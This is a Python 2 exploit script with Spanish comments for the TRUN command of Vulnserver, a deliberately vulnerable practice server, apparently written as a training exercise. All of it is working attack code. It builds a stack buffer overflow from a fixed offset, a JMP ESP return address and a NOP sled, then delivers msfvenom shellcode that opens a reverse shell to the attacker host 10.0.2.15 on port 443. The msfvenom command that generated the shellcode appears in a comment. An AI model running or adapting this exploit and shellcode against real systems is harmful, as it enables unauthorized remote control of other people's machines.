#!/usr/bin/env python2

#  Exploit para VULNSERVER parametro TRUN por German Flores

import socket
import struct


RHOST='win7'  # Aqui va la IP de la victima
RPORT=9999


offset=2002   


#Paso 3:  Determinamos el EIP con !mona modules buscando JMP ESP \xff\xe4 en algun modulo sin protecciones


eip= struct.pack("<L",0x625011AF)   


# Paso 5.    Creamos shellcode con los badchars del paso 4


# msfvenom --platform=windows -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread -b '\x00\x0a\x0d' -f c
# LHOST ES EL HOST DEL ATACANTE 
 

payload = ( 
"\xbd\xbd\x89\x74\xa8\xd9\xcd\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x6a\x12\x83\xea\xfc\x03\xd7\x87\x96\x5d\xdb\x70\xd4"
"\x9e\x23\x81\xb9\x17\xc6\xb0\xf9\x4c\x83\xe3\xc9\x07\xc1\x0f"
"\xa1\x4a\xf1\x84\xc7\x42\xf6\x2d\x6d\xb5\x39\xad\xde\x85\x58"
"\x2d\x1d\xda\xba\x0c\xee\x2f\xbb\x49\x13\xdd\xe9\x02\x5f\x70"
"\x1d\x26\x15\x49\x96\x74\xbb\xc9\x4b\xcc\xba\xf8\xda\x46\xe5"
"\xda\xdd\x8b\x9d\x52\xc5\xc8\x98\x2d\x7e\x3a\x56\xac\x56\x72"
"\x97\x03\x97\xba\x6a\x5d\xd0\x7d\x95\x28\x28\x7e\x28\x2b\xef"
"\xfc\xf6\xbe\xeb\xa7\x7d\x18\xd7\x56\x51\xff\x9c\x55\x1e\x8b"
"\xfa\x79\xa1\x58\x71\x85\x2a\x5f\x55\x0f\x68\x44\x71\x4b\x2a"
"\xe5\x20\x31\x9d\x1a\x32\x9a\x42\xbf\x39\x37\x96\xb2\x60\x50"
"\x5b\xff\x9a\xa0\xf3\x88\xe9\x92\x5c\x23\x65\x9f\x15\xed\x72"
"\xe0\x0f\x49\xec\x1f\xb0\xaa\x25\xe4\xe4\xfa\x5d\xcd\x84\x90"
"\x9d\xf2\x50\x36\xcd\x5c\x0b\xf7\xbd\x1c\xfb\x9f\xd7\x92\x24"
"\xbf\xd8\x78\x4d\x2a\x23\xeb\x78\xab\x29\xe4\x14\xa9\x2d\xfb"
"\x5f\x24\xcb\x91\x8f\x61\x44\x0e\x29\x28\x1e\xaf\xb6\xe6\x5b"
"\xef\x3d\x05\x9c\xbe\xb5\x60\x8e\x57\x36\x3f\xec\xfe\x49\x95"
"\x98\x9d\xd8\x72\x58\xeb\xc0\x2c\x0f\xbc\x37\x25\xc5\x50\x61"
"\x9f\xfb\xa8\xf7\xd8\xbf\x76\xc4\xe7\x3e\xfa\x70\xcc\x50\xc2"
"\x79\x48\x04\x9a\x2f\x06\xf2\x5c\x86\xe8\xac\x36\x75\xa3\x38"
"\xce\xb5\x74\x3e\xcf\x93\x02\xde\x7e\x4a\x53\xe1\x4f\x1a\x53"
"\x9a\xad\xba\x9c\x71\x76\xda\x7e\x53\x83\x73\x27\x36\x2e\x1e"
"\xd8\xed\x6d\x27\x5b\x07\x0e\xdc\x43\x62\x0b\x98\xc3\x9f\x61"
"\xb1\xa1\x9f\xd6\xb2\xe3"
);




def sendData(buffer):
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect((RHOST,RPORT))
		data = s.recv(1024)
		buffer=b"TRUN /.:/ "+buffer
		s.send(buffer)
		print "[+] Payload enviado correctamente a ", RHOST
	except socket.timeout:
		print "[-] No se ha podido conectar a ",RHOST


buffer='\x41'*offset          # Determino este valor en el paso 2 
buffer+=eip           # Determino este valor en el paso 3
buffer+='\x90'*16 + payload           # Determino este valor en el paso 4 y shellcode

sendData(buffer)

